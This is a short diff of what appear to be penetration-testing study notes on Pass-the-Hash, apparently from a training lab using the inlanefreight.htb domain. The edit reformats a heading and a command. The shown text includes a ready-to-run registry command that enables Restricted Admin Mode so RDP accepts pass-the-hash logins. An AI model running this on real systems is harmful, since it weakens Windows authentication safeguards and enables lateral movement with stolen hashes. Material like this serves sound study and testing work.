@@ -104,10 +104,10 @@ Info: Establishing connection to remote endpoint
 ```
 Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb
 
-# PtH with RDP
+# PtH with [[RDP]]
 Enable Restricted Admin Mode to Allow PtH:
 ```cmd
-c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 Connect:
 ```bash
